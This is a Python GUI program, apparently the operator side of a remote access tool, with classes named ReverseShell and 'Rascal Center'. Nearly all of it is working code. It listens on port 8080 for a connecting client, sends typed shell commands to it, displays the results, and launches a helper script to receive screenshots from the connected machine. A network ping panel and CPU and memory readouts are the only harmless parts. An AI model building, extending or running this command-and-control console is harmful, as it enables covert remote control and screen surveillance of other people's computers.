#!/usr/bin/env python3

import socket
import subprocess
import sys
import threading
from tkinter import *
import platform
from PIL import Image, ImageTk

import customtkinter
import psutil

class DeviceInfoFrame(customtkinter.CTkFrame):
    def __init__(self, master, title):
        super().__init__(master, fg_color="#121412", border_color="#303030", border_width=2)
        self.grid_columnconfigure(0, weight=1)

        self.title = title
        self.title = customtkinter.CTkLabel(self, text=self.title, fg_color="#2081E1", corner_radius=8)
        self.title.grid(row=0, column=0, padx=50, sticky="nsew", pady=(10,0))

        self.network_test_title = customtkinter.CTkLabel(self, text="Network Test Results: ", font=("open sans", 16, "bold", "underline"))
        self.network_test_title.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)

        self.network_test = customtkinter.CTkTextbox(self, width=400, height=115, text_color="white", fg_color="#1F1F1F", border_color="gray30", border_width=1)
        self.network_test.grid(row=2, column=0, sticky="w", padx=10, pady=10)

        self.network_status_title = customtkinter.CTkLabel(self, text="Network Status: (Online/Offline): ", font=("open sans", 16, "bold", "underline"))
        self.network_status_title.grid(row=4, column=0, sticky="nsew", padx=10, pady=10)

        self.network_status = customtkinter.CTkLabel(self, text="", fg_color="black", corner_radius=8)
        self.network_status.grid(row=5, column=0, padx=10, pady=3)

        self.spacer2 = customtkinter.CTkLabel(self, text="")
        self.spacer2.grid(row=6, column=0)

        self.device_stat_label = customtkinter.CTkLabel(self, text="Device Stats: ", font=("open sans", 16, "bold", "underline"))
        self.device_stat_label.grid(row=7, column=0, padx=10, pady=1)

        self.cpu_var = StringVar()
        self.cpu_label = customtkinter.CTkLabel(self, textvariable=self.cpu_var)
        self.cpu_label.grid(row=8, column=0)

        self.mem_var= StringVar()
        self.mem_label = customtkinter.CTkLabel(self, textvariable=self.mem_var)
        self.mem_label.grid(row=9, column=0, pady=10)

        # Icon Artist Credit: FreePik. Link: https://www.flaticon.com/authors/freepik
        help_image = customtkinter.CTkImage(Image.open("help-icon.png"), size=(60, 60))

        self.help_button = customtkinter.CTkButton(self, bg_color="#121412", fg_color="#121412", hover_color="#121412", image=help_image, text="", font=("", 15), command=self.begin_task)
        self.help_button.grid(row=10, column=0, pady=10)

        self.proc = None
        self.run_network_test()
        self.update_stats()

    def begin_task(self):
        threading.Thread(target=self.help_panel, daemon=True).start()

    def help_panel(self):
        python_command = sys.executable
        subprocess.run([python_command, 'help_panel.py'])

    def update_stats(self):
        cpu = psutil.cpu_percent()
        mem = psutil.virtual_memory()[2]
        self.cpu_var.set(f"CPU: {cpu}%")
        self.mem_var.set(f"MEMORY: {mem}%")
        self.after(2000, self.update_stats)
    
    def run_network_test(self):
        if platform.system().lower() == "windows":
            self.cmd = ["ping",  "8.8.8.8", "-t"]
        else:
            self.cmd = ["ping",  "8.8.8.8"]
        self.proc = subprocess.Popen(self.cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
        
        self.thread = threading.Thread(target=self.read_stdout, args=(self.proc, self.network_test))
        self.thread.daemon = True 
        self.thread.start()

    def read_stdout(self, proc, textbox):
        while True:
            output = self.proc.stdout.readline()
            
            if output:
                decoded_output = output.decode('utf-8')
                self.network_test.insert('end', decoded_output) 
                self.network_test.yview(END)
                
                if platform.system().lower() != "windows" and b"ttl" in output:
                    self.update_network_status("Online", "green")
                    self.network_status_title.configure(text="Network Status: Online")
                elif platform.system().lower() == "windows" and b"TTL" in output:
                    self.update_network_status("Online", "green")
                    self.network_status_title.configure(text="Network Status: Online")
                else:
                    self.update_network_status("Offline", "red")
                    self.network_status_title.configure(text="Network Status: Offline")

    def update_network_status(self, status, color):
        self.after(0, lambda: self.network_status.configure(text=status, fg_color=color))


class CommandFrame(customtkinter.CTkFrame):
    def __init__(self, master, title):
        super().__init__(master, fg_color="#121412", border_color="#303030", border_width=2)

        self.master.protocol("WM_DELETE_WINDOW", self.on_exit)

        self.grid_columnconfigure(0, weight=1)

        self.title = title
        self.title = customtkinter.CTkLabel(self, text=self.title, fg_color="#2081E1", corner_radius=8)
        self.title.grid(row=0, column=0, padx=50, sticky="nsew", pady=(10,0))

        self.client_connection = None
        self.client_address = None
        self.thread = None
        self.client_connections = []

        thread = threading.Thread(target=self.handle_client)
        thread.start()

        self.commandReceiver = customtkinter.CTkTextbox(self, width=2500, height=400, text_color="white", fg_color="#1F1F1F", border_width=1, border_color="gray30")
        self.commandReceiver.grid(row=2, column=0, sticky="w", padx=10, pady=10)

        self.commandSender = customtkinter.CTkEntry(
            self,
            width=2400,
            height=60,
            text_color="white", 
            fg_color="#1F1F1F",
            border_color="gray30",
            border_width=1,
            placeholder_text="Enter Command..."
        )
        self.commandSender.grid(row=3, column=0, sticky="w", padx=10, pady=10)
        self.commandSender.bind("<Return>", self.send_command)

        self.userCountLabel = customtkinter.CTkLabel(self, text="Connected Users: 0/1")
        self.userCountLabel.grid(row=1, column=0, pady=3)
        
    def send_command(self, event):
        threading.Thread(target=self.image_receiver, daemon=True).start()

        if self.client_conn:
            cmd = self.commandSender.get()
            self.client_conn.send(cmd.encode())
            print(f"[<] {cmd}")
            self.commandReceiver.insert("end", f"[~]:  {cmd}\n")
            self.commandSender.delete(0, END)

    def image_receiver(self):
        try:
            python_command = sys.executable
            subprocess.run([python_command, 'image_receiver.py', 'screenshot.png'], check=True)
        except Exception as error:
            print(f"Something went wrong: {error}...")

    def handle_client(self):
        hostname = socket.gethostname()
        self.HOST = socket.gethostbyname(hostname)
        self.PORT = 8080
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.settimeout(1)  # Set a timeout for the server socket
        self.server.bind((self.HOST, self.PORT))
        self.server.listen(1)

        while True:
            try:
                self.client_conn, self.client_addr = self.server.accept()
                self.server.settimeout(None)  # Reset the timeout after accepting the connection
                self.client_connections.append(self.client_conn)
                self.update_user_count()

                uoutput = f"[+] {self.client_addr} ~ Established a Connection!"
                self.commandReceiver.insert("end", f"{uoutput}\n")
                print(uoutput)

                while True:
                    try:
                        output = self.client_conn.recv(1024).decode()
                        if not output:
                            break
                        print(f"[>] {output}")
                        output_lines = ["\t" + line for line in output.split("\n")]
                        self.commandReceiver.insert("end", "\n".join(output_lines) + "\n")
                        self.commandReceiver.yview(END)
                        self.commandReceiver.insert("end", "\n")
                        self.commandReceiver.update()
                    except:
                        break
                self.client_connections.remove(self.client_conn)
                self.update_user_count()
                disconnected_ip = self.client_addr[0]
                self.commandReceiver.insert("end", f"[!] {disconnected_ip} ~ Disconnected from RShell!\n")
                self.client_conn.close()
            except socket.timeout:
                pass  # Continue the loop if the timeout occurs
            except Exception as e:
                print(f"Error Communicating: {e}")
                break
    
    def update_user_count(self):
        count = len(self.client_connections) #update UI with number of connected users
        self.userCountLabel.configure(text=f"Connected Users: {count}/1")

    def on_exit(self):
        if self.thread:
            self.thread.join() # use hasattr to check self to see if server and client_conn exist, and close them if they do
        if hasattr(self, 'server'): # hasattr checks if the attribute is present in the object. so this checks if commandFrame has attribute server and then if it does it allows the code to close the server socket
            self.server.close()
        if hasattr(self, 'client_conn'): # if theres a client connection, close the socket
            self.client_conn.close()
        self.master.destroy()
            
class ReverseShell(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        customtkinter.set_default_color_theme("blue")

        self.hostname = socket.gethostname()
        self.ipaddr = socket.gethostbyname(self.hostname)

        self.title(f"Server Host: [{self.ipaddr} ~ {self.hostname}]")
        self.geometry("1200x595")
        self._set_appearance_mode("dark")
        self.resizable(False, False)

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        self.serverCommandFrame = CommandFrame(self, "Rascal Center")
        self.serverCommandFrame.grid(row=0, column=0, padx=20, pady=10, columnspan=2, sticky="nsew")

        self.infoFrame = DeviceInfoFrame(self, "Device Information")
        self.infoFrame.grid(row=0, column=2, padx=10, pady=10, sticky="nsew")

if __name__ == "__main__":
    app = ReverseShell()
    app.mainloop()